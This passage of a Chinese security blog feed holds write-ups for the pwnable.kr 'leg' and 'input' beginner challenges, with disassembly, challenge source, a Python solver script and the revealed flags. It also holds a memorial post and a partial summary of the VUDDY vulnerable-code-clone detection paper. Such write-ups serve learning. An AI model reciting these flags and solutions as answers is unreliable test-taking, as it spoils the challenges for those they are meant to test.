0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="pleg-asm">leg.asm</span><a href="#pleg-asm" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) disass main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x00008d3c &lt;+0&gt;:	push	&#123;r4, r11, lr&#125;</span><br><span class="line">   0x00008d40 &lt;+4&gt;:	add	r11, sp, #8</span><br><span class="line">   0x00008d44 &lt;+8&gt;:	sub	sp, sp, #12</span><br><span class="line">   0x00008d48 &lt;+12&gt;:	mov	r3, #0</span><br><span class="line">   0x00008d4c &lt;+16&gt;:	str	r3, [r11, #-16]</span><br><span class="line">   0x00008d50 &lt;+20&gt;:	ldr	r0, [pc, #104]	; 0x8dc0 &lt;main+132&gt;</span><br><span class="line">   0x00008d54 &lt;+24&gt;:	bl	0xfb6c &lt;printf&gt;</span><br><span class="line">   0x00008d58 &lt;+28&gt;:	sub	r3, r11, #16</span><br><span class="line">   0x00008d5c &lt;+32&gt;:	ldr	r0, [pc, #96]	; 0x8dc4 &lt;main+136&gt;</span><br><span class="line">   0x00008d60 &lt;+36&gt;:	mov	r1, r3</span><br><span class="line">   0x00008d64 &lt;+40&gt;:	bl	0xfbd8 &lt;__isoc99_scanf&gt;</span><br><span class="line">   0x00008d68 &lt;+44&gt;:	bl	0x8cd4 &lt;key1&gt;</span><br><span class="line">   0x00008d6c &lt;+48&gt;:	mov	r4, r0</span><br><span class="line">   0x00008d70 &lt;+52&gt;:	bl	0x8cf0 &lt;key2&gt;</span><br><span class="line">   0x00008d74 &lt;+56&gt;:	mov	r3, r0</span><br><span class="line">   0x00008d78 &lt;+60&gt;:	add	r4, r4, r3</span><br><span class="line">   0x00008d7c &lt;+64&gt;:	bl	0x8d20 &lt;key3&gt;</span><br><span class="line">   0x00008d80 &lt;+68&gt;:	mov	r3, r0</span><br><span class="line">   0x00008d84 &lt;+72&gt;:	add	r2, r4, r3</span><br><span class="line">   0x00008d88 &lt;+76&gt;:	ldr	r3, [r11, #-16]</span><br><span class="line">   0x00008d8c &lt;+80&gt;:	cmp	r2, r3</span><br><span class="line">   0x00008d90 &lt;+84&gt;:	bne	0x8da8 &lt;main+108&gt;</span><br><span class="line">   0x00008d94 &lt;+88&gt;:	ldr	r0, [pc, #44]	; 0x8dc8 &lt;main+140&gt;</span><br><span class="line">   0x00008d98 &lt;+92&gt;:	bl	0x1050c &lt;puts&gt;</span><br><span class="line">   0x00008d9c &lt;+96&gt;:	ldr	r0, [pc, #40]	; 0x8dcc &lt;main+144&gt;</span><br><span class="line">   0x00008da0 &lt;+100&gt;:	bl	0xf89c &lt;system&gt;</span><br><span class="line">   0x00008da4 &lt;+104&gt;:	b	0x8db0 &lt;main+116&gt;</span><br><span class="line">   0x00008da8 &lt;+108&gt;:	ldr	r0, [pc, #32]	; 0x8dd0 &lt;main+148&gt;</span><br><span class="line">   0x00008dac &lt;+112&gt;:	bl	0x1050c &lt;puts&gt;</span><br><span class="line">   0x00008db0 &lt;+116&gt;:	mov	r3, #0</span><br><span class="line">   0x00008db4 &lt;+120&gt;:	mov	r0, r3</span><br><span class="line">   0x00008db8 &lt;+124&gt;:	sub	sp, r11, #8</span><br><span class="line">   0x00008dbc &lt;+128&gt;:	pop	&#123;r4, r11, pc&#125;</span><br><span class="line">   0x00008dc0 &lt;+132&gt;:	andeq	r10, r6, r12, lsl #9</span><br><span class="line">   0x00008dc4 &lt;+136&gt;:	andeq	r10, r6, r12, lsr #9</span><br><span class="line">   0x00008dc8 &lt;+140&gt;:			; &lt;UNDEFINED&gt; instruction: 0x0006a4b0</span><br><span class="line">   0x00008dcc &lt;+144&gt;:			; &lt;UNDEFINED&gt; instruction: 0x0006a4bc</span><br><span class="line">   0x00008dd0 &lt;+148&gt;:	andeq	r10, r6, r4, asr #9</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disass key1</span><br><span class="line">Dump of assembler code for function key1:</span><br><span class="line">   0x00008cd4 &lt;+0&gt;:	push	&#123;r11&#125;		; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008cd8 &lt;+4&gt;:	add	r11, sp, #0</span><br><span class="line">   0x00008cdc &lt;+8&gt;:	mov	r3, pc</span><br><span class="line">   0x00008ce0 &lt;+12&gt;:	mov	r0, r3</span><br><span class="line">   0x00008ce4 &lt;+16&gt;:	sub	sp, r11, #0</span><br><span class="line">   0x00008ce8 &lt;+20&gt;:	pop	&#123;r11&#125;		; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008cec &lt;+24&gt;:	bx	lr</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disass key2</span><br><span class="line">Dump of assembler code for function key2:</span><br><span class="line">   0x00008cf0 &lt;+0&gt;:	push	&#123;r11&#125;		; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008cf4 &lt;+4&gt;:	add	r11, sp, #0</span><br><span class="line">   0x00008cf8 &lt;+8&gt;:	push	&#123;r6&#125;		; (str r6, [sp, #-4]!)</span><br><span class="line">   0x00008cfc &lt;+12&gt;:	add	r6, pc, #1</span><br><span class="line">   0x00008d00 &lt;+16&gt;:	bx	r6</span><br><span class="line">   0x00008d04 &lt;+20&gt;:	mov	r3, pc</span><br><span class="line">   0x00008d06 &lt;+22&gt;:	adds	r3, #4</span><br><span class="line">   0x00008d08 &lt;+24&gt;:	push	&#123;r3&#125;</span><br><span class="line">   0x00008d0a &lt;+26&gt;:	pop	&#123;pc&#125;</span><br><span class="line">   0x00008d0c &lt;+28&gt;:	pop	&#123;r6&#125;		; (ldr r6, [sp], #4)</span><br><span class="line">   0x00008d10 &lt;+32&gt;:	mov	r0, r3</span><br><span class="line">   0x00008d14 &lt;+36&gt;:	sub	sp, r11, #0</span><br><span class="line">   0x00008d18 &lt;+40&gt;:	pop	&#123;r11&#125;		; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008d1c &lt;+44&gt;:	bx	lr</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disass key3</span><br><span class="line">Dump of assembler code for function key3:</span><br><span class="line">   0x00008d20 &lt;+0&gt;:	push	&#123;r11&#125;		; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008d24 &lt;+4&gt;:	add	r11, sp, #0</span><br><span class="line">   0x00008d28 &lt;+8&gt;:	mov	r3, lr</span><br><span class="line">   0x00008d2c &lt;+12&gt;:	mov	r0, r3</span><br><span class="line">   0x00008d30 &lt;+16&gt;:	sub	sp, r11, #0</span><br><span class="line">   0x00008d34 &lt;+20&gt;:	pop	&#123;r11&#125;		; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008d38 &lt;+24&gt;:	bx	lr</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><p>c与asm混合编程，只要我们输入的<code>key</code>的值等于<code>key1()+key2()+key3()</code>的值即可。</p><h3><span id="pkey1">key1()</span><a href="#pkey1" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x00008cd4 &lt;+0&gt;:	push	&#123;r11&#125;		; (str r11, [sp, #-4]!)</span><br><span class="line">0x00008cd8 &lt;+4&gt;:	add	r11, sp, #0</span><br><span class="line">0x00008cdc &lt;+8&gt;:	mov	r3, pc</span><br><span class="line">0x00008ce0 &lt;+12&gt;:	mov	r0, r3</span><br><span class="line">0x00008ce4 &lt;+16&gt;:	sub	sp, r11, #0</span><br><span class="line">0x00008ce8 &lt;+20&gt;:	pop	&#123;r11&#125;		; (ldr r11, [sp], #4)</span><br><span class="line">0x00008cec &lt;+24&gt;:	bx	lr</span><br></pre></td></tr></table></figure><p>返回值为<code>r0</code>,<code>r0</code>保存的是<code>0x00008cdc</code>处时的<code>pc</code>值，由于流水线处理，pc为进接的第二条指令的地址，<code>pc=0x00008ce4</code>，<code>key1()=0x00008ce4</code></p><h3><span id="pkey2">key2()</span><a href="#pkey2" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x00008cf0 &lt;+0&gt;:	push	&#123;r11&#125;		; (str r11, [sp, #-4]!)</span><br><span class="line">0x00008cf4 &lt;+4&gt;:	add	r11, sp, #0</span><br><span class="line">0x00008cf8 &lt;+8&gt;:	push	&#123;r6&#125;		; (str r6, [sp, #-4]!)</span><br><span class="line">0x00008cfc &lt;+12&gt;:	add	r6, pc, #1</span><br><span class="line">0x00008d00 &lt;+16&gt;:	bx	r6</span><br><span class="line">0x00008d04 &lt;+20&gt;:	mov	r3, pc</span><br><span class="line">0x00008d06 &lt;+22&gt;:	adds	r3, #4</span><br><span class="line">0x00008d08 &lt;+24&gt;:	push	&#123;r3&#125;</span><br><span class="line">0x00008d0a &lt;+26&gt;:	pop	&#123;pc&#125;</span><br><span class="line">0x00008d0c &lt;+28&gt;:	pop	&#123;r6&#125;		; (ldr r6, [sp], #4)</span><br><span class="line">0x00008d10 &lt;+32&gt;:	mov	r0, r3</span><br><span class="line">0x00008d14 &lt;+36&gt;:	sub	sp, r11, #0</span><br><span class="line">0x00008d18 &lt;+40&gt;:	pop	&#123;r11&#125;		; (ldr r11, [sp], #4)</span><br><span class="line">0x00008d1c &lt;+44&gt;:	bx	lr</span><br></pre></td></tr></table></figure><p>同<code>key1()</code>,r0保存的是<code>r3+#4</code>，而r3是<code>0X00008d04</code>时的pc值，<code>pc=0x00008d08</code>,所以<code>key2()=0x00008d08+4=0x00008d0c</code></p><h3><span id="pkey3">key3()</span><a href="#pkey3" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x00008d20 &lt;+0&gt;:	push	&#123;r11&#125;		; (str r11, [sp, #-4]!)</span><br><span class="line">0x00008d24 &lt;+4&gt;:	add	r11, sp, #0</span><br><span class="line">0x00008d28 &lt;+8&gt;:	mov	r3, lr</span><br><span class="line">0x00008d2c &lt;+12&gt;:	mov	r0, r3</span><br><span class="line">0x00008d30 &lt;+16&gt;:	sub	sp, r11, #0</span><br><span class="line">0x00008d34 &lt;+20&gt;:	pop	&#123;r11&#125;		; (ldr r11, [sp], #4)</span><br><span class="line">0x00008d38 &lt;+24&gt;:	bx	lr</span><br></pre></td></tr></table></figure><p><code>r0</code>的值是<code>lr</code>的值，而<code>lr</code>是子函数返回位置的地址，在main函数中可以看到为<code>0x00008d80</code></p><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><p>所以我们知道<code>key</code>应该等于<code>0x00008d80+0x00008d0c+0x00008ce4=108400</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F; $ .&#x2F;leg</span><br><span class="line">Daddy has very strong arm! : 108400</span><br><span class="line">Congratz!</span><br><span class="line">My daddy has a lot of ARMv5te muscle!</span><br></pre></td></tr></table></figure><p><code>flag</code>：<code>My daddy has a lot of ARMv5te muscle!</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— input</title>
    <url>/2e1b27bb.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mom? how can I pass my input to a computer program?</span><br><span class="line"></span><br><span class="line">ssh input2@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure><p>题目要求我们使用ssh登录到服务器上查看<code>ssh input2@pwnable.kr -p2222</code>，密码是<code>guest</code>,有的时候可能有身份的校验，这个时候需要加上参数<code>-o StrictHostKeyChecking=no</code>进行登录</p><a id="more"></a><h2><span id="pinput-c">input.c</span><a href="#pinput-c" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;socket.h&gt;</span><br><span class="line">#include &lt;arpa&#x2F;inet.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[], char* envp[])&#123;</span><br><span class="line">	printf(&quot;Welcome to pwnable.kr\n&quot;);</span><br><span class="line">	printf(&quot;Let&#39;s see if you know how to give input to program\n&quot;);</span><br><span class="line">	printf(&quot;Just give me correct inputs then you will get the flag :)\n&quot;);</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; argv</span><br><span class="line">	if(argc !&#x3D; 100) return 0;</span><br><span class="line">	if(strcmp(argv[&#39;A&#39;],&quot;\x00&quot;)) return 0;</span><br><span class="line">	if(strcmp(argv[&#39;B&#39;],&quot;\x20\x0a\x0d&quot;)) return 0;</span><br><span class="line">	printf(&quot;Stage 1 clear!\n&quot;);	</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; stdio</span><br><span class="line">	char buf[4];</span><br><span class="line">	read(0, buf, 4);</span><br><span class="line">	if(memcmp(buf, &quot;\x00\x0a\x00\xff&quot;, 4)) return 0;</span><br><span class="line">	read(2, buf, 4);</span><br><span class="line">        if(memcmp(buf, &quot;\x00\x0a\x02\xff&quot;, 4)) return 0;</span><br><span class="line">	printf(&quot;Stage 2 clear!\n&quot;);</span><br><span class="line">	</span><br><span class="line">	&#x2F;&#x2F; env</span><br><span class="line">	if(strcmp(&quot;\xca\xfe\xba\xbe&quot;, getenv(&quot;\xde\xad\xbe\xef&quot;))) return 0;</span><br><span class="line">	printf(&quot;Stage 3 clear!\n&quot;);</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; file</span><br><span class="line">	FILE* fp &#x3D; fopen(&quot;\x0a&quot;, &quot;r&quot;);</span><br><span class="line">	if(!fp) return 0;</span><br><span class="line">	if( fread(buf, 4, 1, fp)!&#x3D;1 ) return 0;</span><br><span class="line">	if( memcmp(buf, &quot;\x00\x00\x00\x00&quot;, 4) ) return 0;</span><br><span class="line">	fclose(fp);</span><br><span class="line">	printf(&quot;Stage 4 clear!\n&quot;);	</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; network</span><br><span class="line">	int sd, cd;</span><br><span class="line">	struct sockaddr_in saddr, caddr;</span><br><span class="line">	sd &#x3D; socket(AF_INET, SOCK_STREAM, 0);</span><br><span class="line">	if(sd &#x3D;&#x3D; -1)&#123;</span><br><span class="line">		printf(&quot;socket error, tell admin\n&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	saddr.sin_family &#x3D; AF_INET;</span><br><span class="line">	saddr.sin_addr.s_addr &#x3D; INADDR_ANY;</span><br><span class="line">	saddr.sin_port &#x3D; htons( atoi(argv[&#39;C&#39;]) );</span><br><span class="line">	if(bind(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0)&#123;</span><br><span class="line">		printf(&quot;bind error, use another port\n&quot;);</span><br><span class="line">    		return 1;</span><br><span class="line">	&#125;</span><br><span class="line">	listen(sd, 1);</span><br><span class="line">	int c &#x3D; sizeof(struct sockaddr_in);</span><br><span class="line">	cd &#x3D; accept(sd, (struct sockaddr *)&amp;caddr, (socklen_t*)&amp;c);</span><br><span class="line">	if(cd &lt; 0)&#123;</span><br><span class="line">		printf(&quot;accept error, tell admin\n&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	if( recv(cd, buf, 4, 0) !&#x3D; 4 ) return 0;</span><br><span class="line">	if(memcmp(buf, &quot;\xde\xad\xbe\xef&quot;, 4)) return 0;</span><br><span class="line">	printf(&quot;Stage 5 clear!\n&quot;);</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; here&#39;s your flag</span><br><span class="line">	system(&quot;&#x2F;bin&#x2F;cat flag&quot;);	</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><h3><span id="pstep-1">step 1:</span><a href="#pstep-1" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(argc !&#x3D; 100) return 0;</span><br><span class="line">if(strcmp(argv[&#39;A&#39;],&quot;\x00&quot;)) return 0;</span><br><span class="line">if(strcmp(argv[&#39;B&#39;],&quot;\x20\x0a\x0d&quot;)) return 0;</span><br><span class="line">printf(&quot;Stage 1 clear!\n&quot;);</span><br></pre></td></tr></table></figure><p>也就是说在执行时传入的参数时，需要有100个参数（包含<code>./input</code>），并且其中的<code>argv['A']</code>要等于<code>\x00</code>,<code>argv['B']</code>要等于<code>\x20\x0a\x0d</code>。</p><h3><span id="pstep-2">step 2:</span><a href="#pstep-2" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">   &#x2F;&#x2F; stdio</span><br><span class="line">char buf[4];</span><br><span class="line">read(0, buf, 4);</span><br><span class="line">if(memcmp(buf, &quot;\x00\x0a\x00\xff&quot;, 4)) return 0;</span><br><span class="line">read(2, buf, 4);</span><br><span class="line">       if(memcmp(buf, &quot;\x00\x0a\x02\xff&quot;, 4)) return 0;</span><br><span class="line">printf(&quot;Stage 2 clear!\n&quot;);</span><br></pre></td></tr></table></figure><p>标准输入输出，从标准输入读取4字节<code>\x00\x0a\x00\xff</code>，从标准错误读取四字节<code>\x00\x0a\x02\xff</code></p><h3><span id="pstep-3">step 3:</span><a href="#pstep-3" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; env</span><br><span class="line">if(strcmp(&quot;\xca\xfe\xba\xbe&quot;, getenv(&quot;\xde\xad\xbe\xef&quot;))) return 0;</span><br><span class="line">printf(&quot;Stage 3 clear!\n&quot;);</span><br></pre></td></tr></table></figure><p>设置环境变量<code>\xde\xad\xbe\xef</code>的值为<code>\xca\xfe\xba\xbe</code></p><h3><span id="pstep-4">step 4:</span><a href="#pstep-4" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">   FILE* fp &#x3D; fopen(&quot;\x0a&quot;, &quot;r&quot;);</span><br><span class="line">if(!fp) return 0;</span><br><span class="line">if( fread(buf, 4, 1, fp)!&#x3D;1 ) return 0;</span><br><span class="line">if( memcmp(buf, &quot;\x00\x00\x00\x00&quot;, 4) ) return 0;</span><br><span class="line">fclose(fp);</span><br><span class="line">printf(&quot;Stage 4 clear!\n&quot;);</span><br></pre></td></tr></table></figure><p>文件操作，从<code>\x0a</code>文件读取四字节，看是否为<code>\x00\x00\x00\x00</code></p><h3><span id="pstep-5">step 5:</span><a href="#pstep-5" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int sd, cd;</span><br><span class="line">	struct sockaddr_in saddr, caddr;</span><br><span class="line">	sd &#x3D; socket(AF_INET, SOCK_STREAM, 0);</span><br><span class="line">	if(sd &#x3D;&#x3D; -1)&#123;</span><br><span class="line">		printf(&quot;socket error, tell admin\n&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	saddr.sin_family &#x3D; AF_INET;</span><br><span class="line">	saddr.sin_addr.s_addr &#x3D; INADDR_ANY;</span><br><span class="line">	saddr.sin_port &#x3D; htons( atoi(argv[&#39;C&#39;]) );</span><br><span class="line">	if(bind(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0)&#123;</span><br><span class="line">		printf(&quot;bind error, use another port\n&quot;);</span><br><span class="line">    		return 1;</span><br><span class="line">	&#125;</span><br><span class="line">	listen(sd, 1);</span><br><span class="line">	int c &#x3D; sizeof(struct sockaddr_in);</span><br><span class="line">	cd &#x3D; accept(sd, (struct sockaddr *)&amp;caddr, (socklen_t*)&amp;c);</span><br><span class="line">	if(cd &lt; 0)&#123;</span><br><span class="line">		printf(&quot;accept error, tell admin\n&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	if( recv(cd, buf, 4, 0) !&#x3D; 4 ) return 0;</span><br><span class="line">	if(memcmp(buf, &quot;\xde\xad\xbe\xef&quot;, 4)) return 0;</span><br><span class="line">	printf(&quot;Stage 5 clear!\n&quot;);</span><br></pre></td></tr></table></figure><p>socket 编程，打开端口<code>argv['C']</code>，监听直到接收到数值，判断是否为<code>\xde\xad\xbe\xef</code></p><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># input.py</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">stdinr, stdinw = os.pipe()</span><br><span class="line">stderrr, stderrw = os.pipe()</span><br><span class="line"></span><br><span class="line">args = list(<span class="string">"A"</span>*<span class="number">99</span>)</span><br><span class="line">args[ord(<span class="string">'A'</span>) - <span class="number">1</span>] = <span class="string">""</span></span><br><span class="line">args[ord(<span class="string">'B'</span>) - <span class="number">1</span>] = <span class="string">"\x20\x0a\x0d"</span></span><br><span class="line">args[ord(<span class="string">"C"</span>) - <span class="number">1</span>] = <span class="string">"8888"</span></span><br><span class="line"></span><br><span class="line">os.write(stdinw, <span class="string">"\x00\x0a\x00\xff"</span>)</span><br><span class="line">os.write(stderrw, <span class="string">"\x00\x0a\x02\xff"</span>)</span><br><span class="line"></span><br><span class="line">environ = &#123;<span class="string">"\xde\xad\xbe\xef"</span> : <span class="string">"\xca\xfe\xba\xbe"</span>&#125;</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">"\x0a"</span> , <span class="string">"wb"</span>)</span><br><span class="line">f.write(<span class="string">"\x00"</span>*<span class="number">4</span>)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">pro = subprocess.Popen([<span class="string">"/home/input2/input"</span>]+args, stdin=stdinr,stderr=stderrr,env=environ)</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line">s.connect((<span class="string">"127.0.0.1"</span>, <span class="number">8888</span>))</span><br><span class="line">s.send(<span class="string">"\xde\xad\xbe\xef"</span>)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><p>但是并没有这么简单，由于文件夹读写权限问题，我们首先需要将脚本scp到<code>/tmp</code>目录下，然后新建一个自己的目录，接着分别建立<code>input.py</code>和<code>flag</code>文件的软链接到自己的目录下，然后执行脚本。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">input2@ubuntu:/tmp$ mkdir ycd</span><br><span class="line">input2@ubuntu:/tmp$ cd ycd</span><br><span class="line">input2@ubuntu:/tmp/ycd$ mv ../input.py .</span><br><span class="line">input2@ubuntu:/tmp/ycd$ ls</span><br><span class="line">input.py</span><br><span class="line">input2@ubuntu:/tmp/ycd$ ln -s /home/input2/flag flag</span><br><span class="line">input2@ubuntu:/tmp/ycd$ python input.py</span><br><span class="line">Welcome to pwnable.kr</span><br><span class="line">Let's see if you know how to give input to program</span><br><span class="line">Just give me correct inputs then you will get the flag :)</span><br><span class="line">Stage 1 clear!</span><br><span class="line">Stage 2 clear!</span><br><span class="line">Stage 3 clear!</span><br><span class="line">Stage 4 clear!</span><br><span class="line">Stage 5 clear!</span><br><span class="line">Mommy! I learned how to pass various input in Linux :)</span><br></pre></td></tr></table></figure><p><code>flag</code>:<code>Mommy! I learned how to pass various input in Linux :)</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.04.04 哀悼为抗击疫情斗争牺牲的烈士和逝世同胞</title>
    <url>/55e3f1f2.html</url>
    <content><![CDATA[<p>哀悼！</p><a id="more"></a><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdh4vk10v7j30u01hcb2a.jpg" alt="image-20200404022013282"></p>]]></content>
      <categories>
        <category>life</category>
      </categories>
      <tags>
        <tag>life</tag>
      </tags>
  </entry>
  <entry>
    <title>VUDDY A Scalable Approach for Vulnerable Code Clone Discovery(S&amp;P 2017)</title>
    <url>/21fd9cb8.html</url>
    <content><![CDATA[<h2><span id="pabstract">Abstract</span><a href="#pabstract" class="header-anchor">#</a></h2><p>随着开源世界的扩大，代码克隆的情况也越来越普遍，与此同时，由于代码克隆产生的1day漏洞也越来越多，因此自动化的克隆代码漏洞检测成为一大需求。</p><p>本文提出了一种大规模复用漏洞代码检测的方法——VUDDY，能在大规模的代码中精确有效的发现漏洞。</p><p>优势：</p><ul><li>十亿行量级的代码检测只需要14小时17分钟</li><li>可进行传统的完全检测和部分正规化后的检测</li><li>规模和准确率完胜其余的相关研究</li><li>有一定的检测0 day漏洞的能力</li></ul><a id="more"></a><h2><span id="pintroduction">Introduction</span><a href="#pintroduction" class="header-anchor">#</a></h2><p>代码克隆缺点：</p><ul><li>raise maintenance costs</li><li>reduce quality</li><li>produce potential legal conflicts</li><li>propagate software vulnerabilities</li><li>…</li></ul><p>最大的问题在于由于代码克隆，一个已经给出的补丁，并不会马上被用于修复使用克隆代码的项目，给黑客的利用提供了可乘之机。</p><p>其余研究的短板：</p><ul><li>CCFinder等：处理太复杂</li><li>ReDeBug：目的是为了大规模、快和准确，但实际效果并不行</li><li>SourcererCC：容易找到已修补的克隆代码</li></ul><p>VUDDY（VUlnerrable coDe clone DiscoverY）…（这名字取的真刻意）：</p><ul><li>函数粒度识别</li><li>正则化使得其漏洞模式（也就是漏洞函数）存在一定通用性</li><li>二级索引：长度+hash，使得其更快</li><li>效果：1764个patch中找到5664个漏洞函数，从25253个C/C++项目中找到了133812个漏洞函数（1 day），比ReDeBug快2倍，having no false positive with Android firmware. Meanwhile, ReDeBug had 17.6 % false positives.</li></ul><p>本文贡献：</p><ul><li>工具VUDDY</li><li>漏洞模式抽象</li><li>自动化漏洞信息获取</li><li>开放服务， <a href="https://iotcube.net/%EF%BC%8C%E6%88%91%E8%AF%95%E7%94%A8%E8%BF%87%EF%BC%8C%E5%81%9A%E7%9A%84%E8%BF%98%E6%98%AF%E5%BE%88%E4%B8%8D%E9%94%99%E7%9A%84%EF%BC%8C%E4%BD%86%E6%98%AF%E8%A6%81%E8%87%AA%E5%B7%B1%E7%94%A8VUDDY%E5%BC%80%E6%BA%90%E7%9A%84%E4%BB%A3%E7%A0%81%E5%A4%84%E7%90%86%E3%80%82%E7%84%B6%E5%90%8E%E6%8F%90%E4%BA%A4hash%E6%96%87%E4%BB%B6%E6%A3%80%E6%B5%8B%E3%80%82" target="_blank" rel="noopener">https://iotcube.net/，我试用过，做的还是很不错的，但是要自己用VUDDY开源的代码处理。然后提交hash文件检测。</a></li></ul><h2><span id="ptaxonomy-and-related-work">Taxonomy and related work</span><a href="#ptaxonomy-and-related-work" class="header-anchor">#</a></h2><h3><span id="ptaxonomy">Taxonomy</span><a href="#ptaxonomy" class="header-anchor">#</a></h3><p>克隆代码分类：</p><ul><li>Type1：完全克隆，无修改</li><li>Type2：重命名克隆，例如类型名，函数名，变量名等</li><li>Type3：简单的增删等</li><li>Type4：语义克隆</li></ul><p>其中VUDDY支持类型1和类型2的检测</p><p>代码粒度分类：</p><ul><li>token</li><li>line</li><li>function</li><li>file</li></ul><h3><span id="prelated-work">related work</span><a href="#prelated-work" class="header-anchor">#</a></h3><p>根据粒度来讲</p><ul><li>token-level：CCFinder（我用过不好用）、CP-Miner</li><li>line-level：Redebug（好用）</li><li>function-leve：SourcererCC（好用）</li><li>file-level：DECKARD、FCFinder</li><li>Hybrid granularity：VulPecker</li></ul><h3><span id="pproblem-and-goal-statement">Problem and goal statement</span><a href="#pproblem-and-goal-statement" class="header-anchor">#</a></h3><h3><span id="pproblem-formulation">Problem formulation</span><a href="#pproblem-formulation" class="header-anchor">#</a></h3><p>克隆检测定义：从一个代码项目中，判断函数是否存在</p><p>完全克隆定义：$C(f)=1$</p><p>抽象克隆定义：</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdgz3a910nj30ru0kmwhq.jpg" alt="image-20200403230003462"></p><h3><span id="pgoals">Goals</span><a href="#pgoals" class="header-anchor">#</a></h3><p>设计一个能检测1、2类克隆的算法</p><h2><span id="pthe-proprosed-method-vuddy">The proprosed method：VUDDY</span><a href="#pthe-proprosed-method-vuddy" class="header-anchor">#</a></h2><p>VUDDY的框架如下图所示：</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdgz59uvxlj30y60u0gsa.jpg" alt="image-20200403230159765"></p><p>分为两个部分：预处理部分和克隆检测部分</p><p>预处理部分：</p><ul><li>函数提取</li><li>抽象和正规化</li><li>漏洞指纹生成</li></ul><p>克隆检测部分：</p><ul><li>key查询</li><li>hash查询</li></ul><h3><span id="ppreprocess">Preprocess</span><a href="#ppreprocess" class="header-anchor">#</a></h3><p><strong>Function retrieval</strong>：使用ANTLR实现了一个提取C程序中的函数的jar包，并提取参数、类型、局部变量信息</p><p><strong>Abstraction and normalization</strong>：对参数、类型、局部变量进行正规化，（统一用某个字符串代替），可以分为不抽象、参数抽象、局部变量抽象、数据类型抽象、函数调用抽象，见下图</p><p><img 